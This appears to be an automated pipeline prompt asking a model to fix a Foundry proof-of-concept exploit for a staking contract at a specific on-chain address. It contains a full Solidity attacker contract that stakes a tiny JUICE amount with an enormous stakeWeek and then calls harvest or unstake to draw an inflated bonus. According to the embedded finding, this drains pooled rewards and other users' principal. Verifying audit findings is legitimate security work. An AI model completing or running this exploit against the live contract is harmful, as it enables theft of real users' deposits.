You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unbounded `stakeWeek` lets a staker mint an arbitrarily large bonus and drain the pool
- claim: `stake()` accepts any positive `stakeWeek`, and both `harvest()` and `unstake()` pay a bonus of `pending * (stakingWeek - 1) * 9 / 100`. Because there is no upper bound or normalization on `stakingWeek`, an attacker can choose an extreme value and turn even a small amount of accrued base reward into an arbitrarily large claim on the contract's shared token balance.
- impact: A permissionless staker can drain not only funded rewards but also other users' deposited principal held by the contract. Once enough balance is extracted, later harvests and unstakes revert, causing theft and permanent lockup for honest users.
- exploit_paths: ["Attacker calls `stake(tinyAmount, hugeStakeWeek)` while staking is open.", "After any nonzero base reward accrues, the attacker calls `harvest(stakeCount)` or waits to call `unstake(stakeCount)`.", "The computed `bonus` becomes enormous and is transferred from the contract's pooled JUICE balance, depleting rewards and potentially user principal."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IJuiceStaking {
    function Juice() external view returns (address);
    function JuiceStaked() external view returns (uint256);
    function rewardPerSecond() external view returns (uint256);
    function stake(uint256 amount, uint256 stakeWeek) external;
    function harvest(uint256 stakeCount) external;
    function unstake(uint256 stakeCount) external;
    function pendingReward(address staker, uint256 stakeCount) external view returns (uint256 pending, uint256 bonus);
    function stakingStartTime() external view returns (uint256);
    function stakingEndTime() external view returns (uint256);
    function stakingCount(address staker) external view returns (uint256);
    function mapStakingInfo(address staker, uint256 stakeCount)
        external
        view
        returns (
            uint256 stakedAmount,
            uint256 startTime,
            uint256 endTime,
            uint256 stakingWeek,
            uint256 rewardDebt,
            uint256 unstakeStatus
        );
}

contract FlawVerifier {
    IJuiceStaking internal constant STAKING = IJuiceStaking(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e);
    address internal constant JUICE = 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae;

    uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
    uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
    uint256 internal constant MAX_STAKE_WEEKS = 1e30;

    uint256 internal baselineBalance;
    uint256 internal trackedStakeIndex;
    uint256 internal chosenStakeWeeks;
    bool internal baselineSet;
    bool internal stakePlaced;

    error StakingNotStarted(uint256 stakingStartTime);
    error StakingClosed(uint256 stakingEndTime, uint256 currentTime);
    error NoVerifierHeldJuice();
    error RewardEmissionInactive();
    error StakeAlreadyExited();
    error RewardNotAccruedYet(uint256 pending, uint256 bonus);

    constructor() {}

    function executeOnOpportunity() public {
        if (!stakePlaced) {
            _openExploitPosition(IERC20Minimal(JUICE));
            return;
        }

        _realizeExploitProfit();
    }

    function profitToken() external pure returns (address) {
        return JUICE;
    }

    function profitAmount() external view returns (uint256) {
        if (!baselineSet) {
            return 0;
        }

        uint256 currentBalance = IERC20Minimal(JUICE).balanceOf(address(this));
        if (currentBalance <= baselineBalance) {
            return 0;
        }

        return currentBalance - baselineBalance;
    }

    function _openExploitPosition(IERC20Minimal juice) internal {
        uint256 stakingStart = STAKING.stakingStartTime();
        if (stakingStart == 0) {
            revert StakingNotStarted(stakingStart);
        }

        uint256 stakingEnd = STAKING.stakingEndTime();
        if (stakingEnd <= block.timestamp) {
            revert StakingClosed(stakingEnd, block.timestamp);
        }

        uint256 available = juice.balanceOf(address(this));
        if (available == 0) {
            // Attempt strategy for this run is direct_or_existing_balance_first.
            // This verifier therefore requires pre-existing JUICE on the verifier itself
            // unless the harness supplies it through realistic public actions outside this contract.
            revert NoVerifierHeldJuice();
        }

        uint256 rewardRate = STAKING.rewardPerSecond();
        if (rewardRate == 0) {
            revert RewardEmissionInactive();
        }

        uint256 currentStaked = STAKING.JuiceStaked();
        uint256 amount = _chooseStakeAmount(available, currentStaked, rewardRate);
        uint256 poolBalance = juice.balanceOf(address(STAKING));
        chosenStakeWeeks = _chooseStakeWeeks(amount, currentStaked, rewardRate, poolBalance);

        baselineBalance = available;
        baselineSet = true;
        trackedStakeIndex = STAKING.stakingCount(address(this));
        require(juice.approve(address(STAKING), amount), "approve failed");
        STAKING.stake(amount, chosenStakeWeeks);
        stakePlaced = true;
    }

    function _realizeExploitProfit() internal {
        (
            uint256 stakedAmount,
            ,
            uint256 endTime,
            ,
            ,
            uint256 unstakeStatus
        ) = STAKING.mapStakingInfo(address(this), trackedStakeIndex);

        if (stakedAmount == 0 || unstakeStatus != 0) {
            revert StakeAlreadyExited();
        }

        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), trackedStakeIndex);
        if (pending == 0) {
            // The hypothesis requires a later reward accrual after the oversized-week stake is opened.
            // If this is still zero, the exploit path has not yet reached the "nonzero base reward accrues" stage.
            revert RewardNotAccruedYet(pending, bonus);
        }

        if (block.timestamp >= endTime) {
            STAKING.unstake(trackedStakeIndex);
        } else {
            STAKING.harvest(trackedStakeIndex);
        }
    }

    function _chooseStakeAmount(
        uint256 available,
        uint256 currentStaked,
        uint256 rewardRate
    ) internal pure returns (uint256) {
        if (currentStaked == 0) {
            return 1;
        }

        uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
        if (divisor == 0) {
            return available;
        }

        uint256 amount = currentStaked / divisor;
        if (currentStaked % divisor != 0) {
            amount += 1;
        }

        if (amount == 0) {
            amount = 1;
        }

        if (amount > available) {
            amount = available;
        }

        return amount;
    }

    function _chooseStakeWeeks(
        uint256 amount,
        uint256 currentStaked,
        uint256 rewardRate,
        uint256 poolBalance
    ) internal pure returns (uint256) {
        uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
        expectedPending = (expectedPending * amount) / (currentStaked + amount);
        if (expectedPending == 0) {
            expectedPending = 1;
        }

        uint256 desiredPayout = poolBalance / PAYOUT_SAFETY_DIVISOR;
        if (desiredPayout <= expectedPending) {
            return 2;
        }

        uint256 bonusBudget = desiredPayout - expectedPending;
        uint256 stakeWeeks = ((bonusBudget * 100) / (expectedPending * 9)) + 1;
        if (stakeWeeks < 2) {
            stakeWeeks = 2;
        }
        if (stakeWeeks > MAX_STAKE_WEEKS) {
            stakeWeeks = MAX_STAKE_WEEKS;
        }
        return stakeWeeks;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: stake(tinyamount, hugestakeweek), harvest(stakecount), unstake(stakecount); generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
